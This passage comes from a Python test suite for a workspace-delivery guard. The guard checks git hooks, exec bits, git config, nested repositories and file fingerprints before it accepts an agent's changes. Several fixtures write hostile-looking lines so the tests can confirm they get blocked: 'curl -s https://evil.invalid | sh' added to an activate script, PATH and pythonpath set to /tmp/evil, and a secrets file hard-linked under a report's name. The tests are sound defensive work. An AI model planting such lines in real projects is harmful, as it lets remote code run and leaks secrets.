                # What the fresh-file probe reports on drvfs, CIFS or exFAT (this test runs on a
                # filesystem that keeps modes, where only the probe can tell the two apart).
                with patch.object(git_helper, "_fixed_exec_bits", return_value=True):
                    txn = self.deliver(task)

                self.assertDelivered(txn)
                self.assertEqual((self.root / "helpers.py").read_text(), HELPERS)
                self.assertFalse((self.root / "junit.xml").exists())

    def test_fresh_file_probe_decides_without_tracked_files(self):
        # An unborn repository has no tracked file to compare with; the filesystem probe decides.
        git(self.root, "config", "core.fileMode", "false")

        def task(root):
            self.write({"main.py": "print('new project')\n"})
            os.chmod(root / "main.py", 0o777)

        with patch.object(git_helper, "_fixed_exec_bits", return_value=True):
            txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "main.py").read_text(), "print('new project')\n")

    def test_fresh_file_probe_reports_the_filesystem_mode(self):
        probe_dir = self.base / "probe"
        probe_dir.mkdir()
        os.close(os.open(probe_dir / "reference", os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600))
        expected = bool(os.stat(probe_dir / "reference").st_mode & 0o111)  # False wherever modes are kept
        os.unlink(probe_dir / "reference")

        self.assertIs(git_helper._fixed_exec_bits(str(probe_dir)), expected)
        self.assertEqual(os.listdir(probe_dir), [])
        self.assertIsNone(git_helper._fixed_exec_bits(str(self.base / "missing")))

    def commit_executable_tracked_files(self):
        self.commit({"app.py": "VALUE = 1\n", "lib.py": "L = 1\n"})
        git(self.root, "config", "core.fileMode", "false")
        chmod_tree(self.root, 0o755)  # copied from a FAT drive, or chmod -R +x: history, not the filesystem

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write({"tool.sh": "#!/bin/sh\necho hi\n"})
            os.chmod(root / "tool.sh", 0o755)
        return task

    def test_fresh_file_probe_decides_over_local_modes_of_tracked_files(self):
        if git_helper._fixed_exec_bits(str(self.base)):
            self.skipTest("the temporary directory itself gives every file an executable bit")
        task = self.commit_executable_tracked_files()

        txn = self.deliver(task)

        self.assertBlocked(txn, "tool.sh")  # the diff shows 100644: the executable bit was never reviewed
        self.assertIn("可执行权限", txn.failure_reason)
        self.assertFalse(os.path.lexists(self.root / "tool.sh"))

    def test_local_modes_of_tracked_files_decide_only_when_the_probe_cannot_run(self):
        task = self.commit_executable_tracked_files()

        with patch.object(git_helper, "_fixed_exec_bits", return_value=None):
            txn = self.deliver(task)

        self.assertDelivered(txn)


class GitHookAttributionTests(HostDeliveryCase):
    def linked_checkout(self):
        self.commit({"app.py": "VALUE = 1\n"})
        main = self.root
        self.root = self.base / "linked"
        git(main, "worktree", "add", "-q", "-b", "feature", str(self.root))
        return main

    def test_review_rejection_quarantines_a_new_hook_and_reports_it(self):
        self.commit({"app.py": "VALUE = 1\n"})
        hook = self.root / ".git/hooks/post-checkout"
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        hook.write_text("#!/bin/sh\nexit 0\n")  # e.g. the user's own `git lfs install` meanwhile
        os.chmod(hook, 0o755)

        self.assertTrue(self.rollback(txn), self.output)

        self.assertFalse(os.path.lexists(hook))
        kept = txn._rejected_dir / "quarantine" / "git-hooks" / "post-checkout"
        self.assertEqual(kept.read_text(), "#!/bin/sh\nexit 0\n")
        self.assertTrue(os.stat(kept).st_mode & 0o100)
        self.assertIn(str(kept), self.output)

    def test_hook_installed_from_another_checkout_does_not_block_and_is_kept(self):
        main = self.linked_checkout()
        hook = main / ".git/hooks/pre-push"

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            hook.write_text("#!/bin/sh\ngit lfs pre-push \"$@\"\n")  # `git lfs install` in the main checkout
            os.chmod(hook, 0o755)

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 2\n")
        self.assertTrue(hook.exists())
        self.assertIn(os.path.realpath(hook), self.output)  # reported for a manual check

    def test_review_rejection_leaves_a_shared_hooks_directory_alone(self):
        main = self.linked_checkout()
        hook = main / ".git/hooks/pre-commit"
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        hook.write_text("#!/bin/sh\nexit 0\n")
        os.chmod(hook, 0o755)

        self.assertTrue(self.rollback(txn), self.output)

        self.assertTrue(hook.exists())
        self.assertIn(os.path.realpath(hook), self.output)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_metadata_only_change_of_an_existing_hook_does_not_block(self):
        self.commit({"app.py": "VALUE = 1\n"})
        hook = self.root / ".git/hooks/pre-commit"
        hook.write_text("#!/bin/sh\nexit 0\n")
        os.chmod(hook, 0o755)

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            time.sleep(0.05)
            os.chmod(hook, 0o755)  # the same mode: only the change time moves

        self.assertDelivered(self.deliver(task))
        self.assertEqual(hook.read_text(), "#!/bin/sh\nexit 0\n")


class UserGitConfigTests(HostDeliveryCase):
    def test_diff_relative_from_a_subdirectory_does_not_block_reviewed_files(self):
        self.commit({"src/app.py": "VALUE = 1\n"}, gitignore="__pycache__/\n")
        git(self.root, "config", "diff.relative", "true")
        txn = HostWorkspaceTransaction(str(self.root / "src"))
        self.assertIsNone(txn.capture_pre_snapshot())
        self.assertIsNone(txn.begin())
        (self.root / "src/app.py").write_text("from helpers import double\nVALUE = double(1)\n")
        self.write({"src/helpers.py": HELPERS, "docs/new.md": "doc\n"})

        self.finalize(txn)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "src/helpers.py").read_text(), HELPERS)

    def test_review_diff_covers_the_whole_repository_whatever_the_diff_config(self):
        self.commit({"src/app.py": "VALUE = 1\n", "README.md": "x\n"})
        for key, value in (("diff.relative", "true"), ("color.ui", "always"), ("diff.noprefix", "true")):
            git(self.root, "config", key, value)
        (self.root / "src/app.py").write_text("VALUE = 2\n")
        (self.root / "README.md").write_text("y\n")

        diff, error = git_helper.get_git_diff_status(str(self.root / "src"))

        self.assertIsNone(error)
        self.assertIn("diff --git a/README.md b/README.md", diff)
        self.assertIn("diff --git a/src/app.py b/src/app.py", diff)
        self.assertNotIn("\x1b[", diff)

    def test_rejected_patch_applies_whatever_the_diff_config(self):
        self.commit({"app.py": "a\nb\nc\nd\ne\nf\ng\n"}, gitignore=".envrc\n")
        for key, value in (("color.ui", "always"), ("diff.noprefix", "true"), ("diff.context", "0"),
                           ("diff.mnemonicPrefix", "true")):
            git(self.root, "config", key, value)

        def task(root):
            (root / "app.py").write_text("a\nb\nc\nD\ne\nf\ng\n")
            self.write({"helpers.py": HELPERS, ".envrc": "export PATH=/tmp/evil:$PATH\n"})

        txn = self.deliver(task)

        self.assertBlocked(txn, ".envrc")
        patch_file = txn._rejected_dir / "rejected.patch"
        self.assertNotIn(b"\x1b[", patch_file.read_bytes())
        self.recover(patch_file)
        self.assertEqual((self.root / "app.py").read_text(), "a\nb\nc\nD\ne\nf\ng\n")
        self.assertEqual((self.root / "helpers.py").read_text(), HELPERS)

    def test_run_git_cmd_neutralizes_diff_config_after_global_options(self):
        with patch("subprocess.run") as run:
            run.return_value = MagicMock(returncode=0, stdout=b"", stderr=b"")
            run_git_cmd(["git", "--no-replace-objects", "diff", "--binary", "A", "B"], binary=True)
            command = run.call_args[0][0]
        position = command.index("diff")
        for flag in ("--no-ext-diff", "--no-textconv", "--no-color", "--no-relative",
                     "--src-prefix=a/", "--dst-prefix=b/", "--submodule=short"):
            self.assertIn(flag, command[position + 1:])
        self.assertEqual(command[-3:], ["--binary", "A", "B"])  # the caller's own options come last and win

    def test_untracked_files_count_as_dirty_whatever_status_show_untracked_files_says(self):
        self.commit({"app.py": "VALUE = 1\n"})
        git(self.root, "config", "status.showUntrackedFiles", "no")
        self.write({"notes.txt": "work in progress\n"})

        with patch.object(git_helper, "get_active_interactive_working_trees", return_value={}):
            safe, message = git_helper.check_working_tree_isolation(str(self.root))

        self.assertFalse(safe)
        self.assertIn("Dirty Working Tree", message)

    def test_dirty_file_names_are_returned_unquoted(self):
        self.commit({"app.py": "VALUE = 1\n"})
        self.write({"données.py": "x = 1\n", "app.py": "VALUE = 2\n"})

        dirty = git_helper.get_dirty_files(str(self.root))

        self.assertIn("données.py", dirty)
        self.assertIn("app.py", dirty)

    def test_staged_rename_at_task_start_verifies_after_rollback(self):
        self.commit({"old_name.py": "X = 1\n", "app.py": "VALUE = 1\n"})
        git(self.root, "mv", "old_name.py", "new_name.py")  # the user's staged work in progress
        txn = self.start()
        self.assertTrue(txn.initial_dirty)
        (self.root / "app.py").write_text("VALUE = 2\n")

        self.assertTrue(self.rollback(txn), self.output)

        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")
        self.assertEqual((self.root / "new_name.py").read_text(), "X = 1\n")

    def test_glob_like_file_name_restores_only_itself(self):
        self.commit({"[ab].txt": "pattern\n", "a.txt": "a\n", "app.py": "VALUE = 1\n"})
        (self.root / "a.txt").write_text("user work in progress\n")
        txn = self.start()
        (self.root / "[ab].txt").write_text("task\n")

        self.assertTrue(self.rollback(txn), self.output)

        self.assertEqual((self.root / "[ab].txt").read_text(), "pattern\n")
        self.assertEqual((self.root / "a.txt").read_text(), "user work in progress\n")

    def test_shadow_copy_reproduces_work_in_progress_whatever_the_user_config(self):
        self.commit({"app.py": "a\nb\nc\nd\ne\nf\ng\n"})
        user_config = Path(os.environ["HOME"]) / ".gitconfig"
        self.assertFalse(user_config.exists())
        user_config.write_text("[color]\n\tui = always\n[diff]\n\tcontext = 0\n\tnoprefix = true\n"
                               "[apply]\n\twhitespace = error\n")
        self.addCleanup(user_config.unlink)
        work = "a\nb\nc\nD   \ne\nf\ng\n"  # a trailing-whitespace edit
        (self.root / "app.py").write_text(work)

        out = io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(out):
            shadow = git_helper.create_ephemeral_shadow_worktree(str(self.root), prefix="cfg")
        self.assertIsNotNone(shadow[0], out.getvalue())
        self.addCleanup(shadow[2])
        self.assertEqual((Path(shadow[0]) / "app.py").read_text(), work)


class ContentNotCtimeTests(HostDeliveryCase):
    def test_metadata_only_change_of_preexisting_ignored_files_does_not_block(self):
        self.commit({"app.py": "VALUE = 1\n", "utils.py": "Y = 1\n"}, gitignore="__pycache__/\n.venv/\n")
        pyc = Path(py_compile.compile(str(self.root / "utils.py"), doraise=True))
        extension = self.root / ".venv/lib/python3.12/site-packages/fast/_x.so"
        self.write({".venv/lib/python3.12/site-packages/fast/_x.so": b"\x7fELF venv"})
        pyc_bytes = pyc.read_bytes()

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            time.sleep(0.05)
            for path in (pyc, extension):
                os.chmod(path, stat.S_IMODE(os.stat(path).st_mode))  # only the change time moves

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertEqual(pyc.read_bytes(), pyc_bytes)
        self.assertEqual(extension.read_bytes(), b"\x7fELF venv")

    def test_metadata_change_of_a_file_without_a_digest_blocks_as_unconfirmed(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore=".venv/\n")
        rel = ".venv/lib/python3.12/site-packages/fast/_x.so"
        extension = self.root / rel
        self.write({rel: b"\x7fELF venv"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            time.sleep(0.05)
            os.chmod(extension, stat.S_IMODE(os.stat(extension).st_mode))

        with patch.dict(os.environ, {"MAKEWAND_FINGERPRINT_TOTAL_LIMIT": "1"}):
            txn = self.deliver(task)

        self.assertBlocked(txn, rel)
        # Possibly unmodified: never reported as changed or lost, and the limit to raise is named.
        self.assertIn("无法确认", txn.failure_reason)
        self.assertIn("MAKEWAND_FINGERPRINT_TOTAL_LIMIT", txn.failure_reason)
        self.assertNotIn("无法恢复", txn.failure_reason)
        self.assertNotIn("未能恢复原内容", self.output)
        self.assertNotIn("可执行或二进制产物", txn.failure_reason)
        self.assertEqual(txn.unconfirmed, {rel})
        self.assertEqual(extension.read_bytes(), b"\x7fELF venv")

    def test_in_place_rewrite_with_restored_mtime_blocks_and_says_what_is_lost(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="node_modules/\n")
        lib = self.root / "node_modules/leftpad/index.js"
        original = b"module.exports = 1;            \n"
        self.write({"node_modules/leftpad/index.js": original})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            info = os.stat(lib)
            time.sleep(0.05)
            lib.write_bytes(b"require('x');" + b" " * (len(original) - 14) + b"\n")  # same size
            os.utime(lib, ns=(info.st_atime_ns, info.st_mtime_ns))

        txn = self.deliver(task)

        self.assertBlocked(txn, "node_modules/leftpad/index.js")
        self.assertNotIn("改动已回滚", txn.failure_reason)
        self.assertIn("无法恢复: node_modules/leftpad/index.js", txn.failure_reason)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_bytecode_of_a_source_the_task_deleted_is_purged(self):
        self.commit({"app.py": "VALUE = 1\n", "old.py": "X = 1\n"}, gitignore="__pycache__/\n")

        def task(root):
            py_compile.compile(str(root / "old.py"), doraise=True)  # tests ran before the refactoring
            (root / "old.py").unlink()
            (root / "app.py").write_text("X = 1\nVALUE = 2\n")

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertFalse((self.root / "old.py").exists())
        self.assertEqual(list(self.root.glob("__pycache__/old.*")), [])

    def test_bytecode_of_a_source_that_never_existed_still_blocks(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="__pycache__/\n")

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write({"__pycache__/ghost.cpython-312.pyc": b"\x00" * 16})

        self.assertBlocked(self.deliver(task), "__pycache__/ghost.cpython-312.pyc")

    def test_rewritten_preexisting_bytecode_is_purged_on_rollback(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="__pycache__/\n")
        pyc = Path(py_compile.compile(str(self.root / "app.py"), doraise=True))
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2  # changed\n")
        py_compile.compile(str(self.root / "app.py"), doraise=True)

        self.assertTrue(self.rollback(txn), self.output)

        self.assertFalse(pyc.exists())  # Python regenerates it from the restored source
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_hard_link_named_like_a_report_still_blocks(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore=".env\njunit.xml\n")
        self.write({".env": "SECRET=1\n"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            os.link(root / ".env", root / "junit.xml")

        txn = self.deliver(task)

        self.assertBlocked(txn, "junit.xml")
        self.assertEqual((self.root / ".env").read_text(), "SECRET=1\n")


class SharedTestOutputTests(HostDeliveryCase):
    GATE_OUTPUT = {
        "coverage.lcov": b"TN:\n",
        "report.xml": b"<testsuite tests='1'/>",
        "coverage/lcov.info": b"TN:\n",
        "test-results/results.xml": b"<testsuite tests='1'/>",
        ".hypothesis/examples/1a2b/3c4d": b"\x00\x01",
        "pytest.log": b"collected 1 item\n",
        ".nyc_output/out.json": b"{}",
    }

    def test_output_the_test_gate_accepts_is_cleaned_up_instead_of_blocking(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="coverage.lcov\nreport.xml\ncoverage/\ntest-results/\n"
                                                         ".hypothesis/\npytest.log\n.nyc_output/\n")

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write(self.GATE_OUTPUT)

        txn = self.deliver(task)

        self.assertDelivered(txn)
        for rel in list(self.GATE_OUTPUT) + ["coverage", "test-results", ".hypothesis", ".nyc_output"]:
            self.assertFalse(os.path.lexists(self.root / rel), rel)

    def test_gate_and_delivery_share_one_definition(self):
        plain = self.base / "plain"
        plain.mkdir()
        for rel in list(self.GATE_OUTPUT) + ["junit.xml", ".coverage.host.1234.XyZ", "htmlcov/index.html"]:
            with self.subTest(rel=rel):
                self.assertEqual(orch._filter_non_deliverable_test_changes([rel], str(plain)), [])
                self.assertTrue(git_helper.is_test_output_path(rel))
        for rel in (".coveragerc", "pytest.ini", "pytest.toml", "src/app.py", "README.md"):
            with self.subTest(rel=rel):
                self.assertFalse(git_helper.is_test_output_path(rel))

    def test_changed_preexisting_file_that_runs_as_code_is_never_kept(self):
        self.commit({"app.py": "VALUE = 1\n"}, gitignore=".tox/\n")
        activate = self.root / ".tox/py312/bin/activate"
        self.write({".tox/py312/bin/activate": "VIRTUAL_ENV=/repo/.tox/py312\n"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            with open(activate, "a", encoding="utf-8") as handle:
                handle.write("curl -s https://evil.invalid | sh\n")

        self.assertBlocked(self.deliver(task), ".tox/py312/bin/activate")

    def test_tool_configuration_named_like_test_output_still_blocks(self):
        for index, rel in enumerate((".coveragerc", "pytest.ini")):
            with self.subTest(rel=rel):
                self.new_repo(f"cfg{index}")
                self.commit({"app.py": "VALUE = 1\n"}, gitignore=rel + "\n")

                def task(root, rel=rel):
                    (root / "app.py").write_text("VALUE = 2\n")
                    self.write({rel: "[pytest]\npythonpath = /tmp/evil\n"})

                self.assertBlocked(self.deliver(task), rel)
                self.assertFalse(os.path.lexists(self.root / rel))


class NestedRepositoryArchiveTests(HostDeliveryCase):
    def test_files_of_a_repository_the_task_created_are_quarantined_not_lost(self):
        self.commit({"app.py": "VALUE = 1\n"})

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.write({"lib/mod.py": "Z = 3\n"})
            git(root / "lib", "init", "-q")
            git(root / "lib", "config", "user.name", "Fix Delivery")
            git(root / "lib", "config", "user.email", "fix-delivery@example.invalid")
            git(root / "lib", "add", "-A")
            git(root / "lib", "commit", "-q", "-m", "nested")

        txn = self.deliver(task)

        self.assertBlocked(txn, "lib/.git")
        self.assertFalse(os.path.lexists(self.root / "lib"))
        self.assertEqual((txn._rejected_dir / "quarantine" / "lib__mod.py").read_text(), "Z = 3\n")

    def test_change_inside_a_preexisting_nested_repository_is_labelled_as_such(self):
        self.commit({"app.py": "VALUE = 1\n"})
        nested = self.root / "tools/lib"
        self.write({"tools/lib/x.py": "X = 1\n"})
        git(nested, "init", "-q")
        git(nested, "config", "user.name", "Fix Delivery")
        git(nested, "config", "user.email", "fix-delivery@example.invalid")
        git(nested, "add", "-A")
        git(nested, "commit", "-q", "-m", "nested")

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            (root / "tools/lib/x.py").write_text("X = 666\n")  # the review diff shows only the embedded commit

        txn = self.deliver(task)

        self.assertBlocked(txn, "tools/lib/x.py")
        self.assertIn("子模块或嵌套 Git 仓库", txn.failure_reason)
        self.assertNotIn("被 .gitignore 忽略", txn.failure_reason)
        self.assertEqual((self.root / "tools/lib/x.py").read_text(), "X = 1\n")
        # git status lists the untracked nested repository as "tools/lib/": no false rollback failure.
        self.assertIn("改动已回滚", txn.failure_reason)
        self.assertNotIn("被跟踪文件未能恢复", self.output)


class SharedHooksDirectoryTests(HostDeliveryCase):
    """Hooks directories other checkouts use: changes are reported, never blocked, moved or deleted."""

    def install_hook(self, path, body="#!/bin/sh\nexit 0\n"):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body)
        os.chmod(path, 0o755)

    def add_linked_worktree(self, branch="feature"):
        git(self.root, "worktree", "add", "-q", "-b", branch, str(self.base / f"linked-{branch}"))

    def assertReported(self, directory):
        self.assertIn("共用的 Git hooks 目录", self.output)
        self.assertIn(os.path.realpath(directory), self.output)
        self.assertNotIn("安全阻断", self.output)

    def test_main_checkout_with_a_linked_worktree_shares_its_hooks(self):
        self.commit({"app.py": "VALUE = 1\n"})
        self.add_linked_worktree()
        hook = self.root / ".git/hooks/pre-commit"

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            # `pre-commit install`, run meanwhile in the linked worktree, writes the common hooks directory.
            self.install_hook(hook, "#!/bin/sh\nexec pre-commit hook-impl \"$@\"\n")

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 2\n")
        self.assertTrue(hook.exists())
        self.assertReported(hook.parent)

    def test_review_rejection_in_the_main_checkout_leaves_a_shared_hook_alone(self):
        self.commit({"app.py": "VALUE = 1\n"})
        self.add_linked_worktree()
        hook = self.root / ".git/hooks/pre-push"
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        self.install_hook(hook, "#!/bin/sh\ngit lfs pre-push \"$@\"\n")

        self.assertTrue(self.rollback(txn), self.output)

        self.assertEqual(hook.read_text(), "#!/bin/sh\ngit lfs pre-push \"$@\"\n")
        self.assertFalse((txn._rejected_dir / "quarantine").exists())
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")
        self.assertIn(os.path.realpath(hook.parent), self.output)

    def test_preexisting_hook_rewritten_in_a_shared_directory_is_reported_not_blocked(self):
        self.commit({"app.py": "VALUE = 1\n"})
        hook = self.root / ".git/hooks/pre-commit"
        self.install_hook(hook, "#!/bin/sh\n# legacy hook\nexit 0\n")
        self.add_linked_worktree()

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            hook.write_text("#!/bin/sh\n# pre-commit install --overwrite\nexec pre-commit hook-impl \"$@\"\n")

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertReported(hook.parent)

    def test_linked_worktree_added_during_the_task_shares_the_hooks(self):
        self.commit({"app.py": "VALUE = 1\n"})
        hook = self.root / ".git/hooks/post-checkout"

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.add_linked_worktree("parallel-session")  # the user's second session starts meanwhile
            self.install_hook(hook)

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertTrue(hook.exists())
        self.assertReported(hook.parent)

    def test_hooks_path_outside_the_work_tree_is_shared(self):
        self.commit({"app.py": "VALUE = 1\n"})
        team_hooks = self.base / "team-hooks"
        team_hooks.mkdir()
        git(self.root, "config", "core.hooksPath", str(team_hooks))

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            self.install_hook(team_hooks / "pre-push")  # e.g. git lfs install, honouring core.hooksPath

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertTrue((team_hooks / "pre-push").exists())
        self.assertReported(team_hooks)

    def test_sample_hooks_recreated_by_git_init_are_ignored(self):
        self.commit({"app.py": "VALUE = 1\n"})
        for sample in (self.root / ".git/hooks").glob("*.sample"):
            sample.unlink()

        def task(root):
            (root / "app.py").write_text("VALUE = 2\n")
            git(root, "init", "-q")  # re-copies the template's *.sample hooks

        txn = self.deliver(task)

        self.assertDelivered(txn)
        self.assertTrue(list((self.root / ".git/hooks").glob("*.sample")))
        self.assertNotIn("hook", self.output)


class UnfingerprintedFileTests(HostDeliveryCase):
    """Pre-existing files without a full digest (over MAKEWAND_FINGERPRINT_FILE_LIMIT,
    past the total or time budget): metadata alone never counts as a modification."""

    BIG = ".venv/lib/python3.12/site-packages/torch/lib/libtorch_cuda.so"
    SIZE = 4 * 1024 * 1024

    def setUp(self):
        super().setUp()
        self.commit({"app.py": "VALUE = 1\n"}, gitignore=".venv/\n")
        self.big = self.root / self.BIG
        self.big.parent.mkdir(parents=True)
        with open(self.big, "wb") as handle:
            handle.write(b"\x7fELF")
            handle.truncate(self.SIZE)
        self.outside = self.base / "uv-cache"  # another environment on the same filesystem
        self.outside.mkdir()

    def start_without_full_digests(self):
        with patch.dict(os.environ, {"MAKEWAND_FINGERPRINT_FILE_LIMIT": str(1024 * 1024)}):
            txn = self.start()
        self.assertNotIn(self.BIG, txn.fingerprints)
        return txn

    def test_hard_link_added_elsewhere_to_a_file_without_a_digest_does_not_block(self):
        txn = self.start_without_full_digests()
        (self.root / "app.py").write_text("VALUE = 2\n")
        time.sleep(0.05)
        os.link(self.big, self.outside / "libtorch_cuda.so")  # `uv sync` in another project
        self.assertNotEqual(os.stat(self.big).st_ctime_ns, txn.pre[self.BIG].ctime_ns)

        self.finalize(txn)

        self.assertDelivered(txn)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 2\n")

    def test_hard_link_to_a_sampled_file_past_the_total_budget_does_not_block(self):
        # __init__.py fills the digest total; _x.so, past it, is sampled from the sample budget.
        rel = ".venv/lib/python3.12/site-packages/fast/_x.so"
        self.write({rel: b"\x7fELF small", ".venv/lib/python3.12/site-packages/fast/__init__.py": "X = 1\n"})
        with patch.dict(os.environ, {"MAKEWAND_FINGERPRINT_TOTAL_LIMIT": "12"}):
            txn = self.start()
        self.assertNotIn(rel, txn.fingerprints)
        self.assertIn(rel, txn.samples)
        (self.root / "app.py").write_text("VALUE = 2\n")
        time.sleep(0.05)
        os.link(self.root / rel, self.outside / "_x.so")
        self.assertNotEqual(os.stat(self.root / rel).st_ctime_ns, txn.pre[rel].ctime_ns)

        self.assertDelivered(self.finalize(txn))

    def test_rewrite_behind_an_added_hard_link_is_caught_by_the_sampled_fingerprint(self):
        txn = self.start_without_full_digests()
        self.assertIn(self.BIG, txn.samples)
        (self.root / "app.py").write_text("VALUE = 2\n")
        info = os.stat(self.big)
        time.sleep(0.05)
        self.big.write_bytes(b"\x7fELF" + b"\x90" * (self.SIZE - 4))  # same size, another payload
        os.utime(self.big, ns=(info.st_atime_ns, info.st_mtime_ns))
        os.link(self.big, self.outside / "libtorch_cuda.so")

        self.finalize(txn)

        self.assertBlocked(txn, self.BIG)
        self.assertIn("无法恢复", txn.failure_reason)  # it was modified, and nothing can restore it

    def test_in_place_patch_without_a_digest_is_never_delivered(self):
        txn = self.start_without_full_digests()
        (self.root / "app.py").write_text("VALUE = 2\n")
        info = os.stat(self.big)
        time.sleep(0.05)
        with open(self.big, "r+b") as handle:
            handle.seek(100000)  # between two sampled chunks
            handle.write(b"EVIL")
        os.utime(self.big, ns=(info.st_atime_ns, info.st_mtime_ns))

        self.finalize(txn)

        self.assertBlocked(txn, self.BIG)
        self.assertIn("无法确认", txn.failure_reason)
        self.assertIn("MAKEWAND_FINGERPRINT_FILE_LIMIT", txn.failure_reason)
        self.assertNotIn("无法恢复", txn.failure_reason)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")


class RollbackCostTests(HostDeliveryCase):
    """Rollback re-hashes only files whose stat moved, within the fingerprinting budget."""

    def setUp(self):
        super().setUp()
        self.commit({"app.py": "VALUE = 1\n"}, gitignore="node_modules/\n")
        self.files = {f"node_modules/pkg{i % 3}/lib/f{i}.js": f"module.exports = {i};\n" for i in range(300)}
        self.write(self.files)

    def test_rollback_does_not_rehash_or_revisit_untouched_files(self):
        txn = self.start()
        self.assertEqual(len(txn.fingerprints), len(self.files))
        (self.root / "app.py").write_text("VALUE = 2\n")

        with patch.object(git_helper, "_file_sha256_at", wraps=git_helper._file_sha256_at) as hashed, \
                patch.object(git_helper, "_lstat_at", wraps=git_helper._lstat_at) as looked_up:
            self.assertTrue(self.rollback(txn), self.output)

        self.assertEqual(hashed.call_count, 0)
        self.assertLess(looked_up.call_count, 20)
        self.assertEqual((self.root / "app.py").read_text(), "VALUE = 1\n")

    def test_begin_opens_each_directory_once(self):
        txn = HostWorkspaceTransaction(str(self.root))
        self.assertIsNone(txn.capture_pre_snapshot())

        with patch.object(git_helper, "_open_parent", wraps=git_helper._open_parent) as opened:
            self.assertIsNone(txn.begin())

        self.assertEqual(len(txn.fingerprints), len(self.files))
        self.assertLess(opened.call_count, 20)
        self.assertTrue(self.rollback(txn), self.output)

    def touch_metadata(self):
        time.sleep(0.05)
        for rel in self.files:
            os.chmod(self.root / rel, stat.S_IMODE(os.stat(self.root / rel).st_mode))  # ctime only

    def test_rollback_verification_stops_hashing_when_the_budget_runs_out(self):
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        self.touch_metadata()

        with patch.object(git_helper._DigestBudget, "expired", return_value="超出摘要时间预算"), \
                patch.object(git_helper, "_file_sha256_at", wraps=git_helper._file_sha256_at) as hashed:
            self.assertTrue(self.rollback(txn), self.output)

        self.assertEqual(hashed.call_count, 0)
        self.assertEqual(len(txn.unverified), len(self.files))
        self.assertIn("无法核实", self.output)
        self.assertNotIn("未能恢复原内容", self.output)

    def test_delivery_check_reports_what_it_cannot_rehash_in_time_as_unconfirmed(self):
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        self.touch_metadata()

        with patch.object(git_helper._DigestBudget, "expired", return_value="超出摘要时间预算"):
            self.finalize(txn)

        self.assertBlocked(txn, "node_modules/pkg0/lib/f0.js")
        self.assertIn("无法确认", txn.failure_reason)
        self.assertNotIn("无法恢复", txn.failure_reason)

    def test_rehashed_metadata_change_within_the_budget_is_delivered(self):
        txn = self.start()
        (self.root / "app.py").write_text("VALUE = 2\n")
        self.touch_metadata()

        self.assertDelivered(self.finalize(txn))


class DefaultReportLocationTests(HostDeliveryCase):
    # A package's own report directory (packages/web/coverage/) counts only where its
    # manifest is found: test_fix_delivery_host_block_r4.ReportDirectoryLocationTests.
    OUTPUT = (
        "coverage/lcov-report/index.html", "coverage/lcov-report/prettify.js", "coverage/clover.xml",
        "coverage/coverage-final.json", "coverage/tmp/coverage-4242-1700000000000-0.json",
        "playwright-report/index.html", "test-results/.last-run.json",
        "node_modules/.vite/vitest/da39a3ee/results.json", "node_modules/.vitest/results.json",
    )
    NOT_OUTPUT = (
        "coverage.py", "coverage/conftest.py", "src/coverage", ".venv/bin/coverage",
        "node_modules/some-lib/coverage/index.js", ".venv/lib/python3.12/site-packages/coverage/htmlfiles/x.js",
        "node_modules/.vite/deps/react.js", "node_modules/.cache/babel-loader/1a2b.json",
        "node_modules/.vite/vitest/da39a3ee/other.json",
    )

    def test_default_report_locations_are_test_output_and_code_is_not(self):
        for rel in self.OUTPUT:
            with self.subTest(rel=rel):
                self.assertTrue(git_helper.is_test_output_path(rel))
        for rel in self.NOT_OUTPUT:
            with self.subTest(rel=rel):
                self.assertFalse(git_helper.is_test_output_path(rel))

    def test_test_gate_uses_the_same_definition(self):
        plain = self.base / "plain"
        plain.mkdir()
        for rel in self.OUTPUT:
